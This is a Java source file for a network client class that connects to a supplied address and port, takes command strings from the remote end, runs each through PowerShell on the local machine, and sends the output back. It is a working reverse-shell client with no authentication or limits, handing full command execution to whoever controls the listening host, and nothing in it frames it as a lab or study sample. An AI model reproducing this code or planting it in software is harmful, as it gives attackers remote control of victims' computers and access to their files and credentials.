package org.fun;

import java.io.*;
import java.net.Socket;

public class Client extends Thread{
    private Socket socket;
    private Runtime process;
    private String directory = System.getProperty("user.dir");
    private DataInputStream input;
    private DataOutputStream output;
    public Client(String address, int port) {
        try {
            socket = new Socket(address, port);
            input = new DataInputStream(socket.getInputStream());
            output = new DataOutputStream((socket.getOutputStream()));
            process = Runtime.getRuntime();
        }
        catch(IOException e) {
            throw new RuntimeException(e);
        }
    }
    private String runCommand(String commands) {
        try {
//            Process subProcess = process.exec("cmd /c " + commands);
            Process subProcess = process.exec("powershell.exe cd " + directory + ";" + commands);
            String message = "";
            BufferedReader br = new BufferedReader(new InputStreamReader(
                    subProcess.getInputStream()));
            String line;
            while ((line = br.readLine()) != null) {
                message += line + "\n";
                if (line.strip().startsWith("Directory: ") && commands.startsWith("cd")) {
                    directory = line.strip().substring("Directory:".length(), line.strip().length());
                }
            }
            br.close();
            return message;
        }
        catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
    private String runMessage(String message) {
        return runCommand(message);
    }
    private void sendMessage(String message) {
        try {
            output.writeChars(message + "`");
        }
        catch (IOException e) {
            throw new RuntimeException("Failed to send message");
        }
    }
    public void communicationLoop() {
        String message = "";
        boolean toggle = false;
        char charToAdd;
        while (true) {
            try {
                if (input.available() > 0) {
                    while (input.available() > 0) {
                        charToAdd = input.readChar();
                        if (charToAdd == '`') {
                            toggle = true;
                            break;
                        }
                        message += charToAdd;
                    }
                    if (toggle) {
                        System.out.println(message);
                        toggle = false;
                        String out = runMessage(message);
                        System.out.println(out);
                        if (out != null)
                            sendMessage(out);
                        message = "";
                    }
                }
            }
            catch (IOException e) {
                throw new RuntimeException("Failed to read message");
            }
        }
    }
}
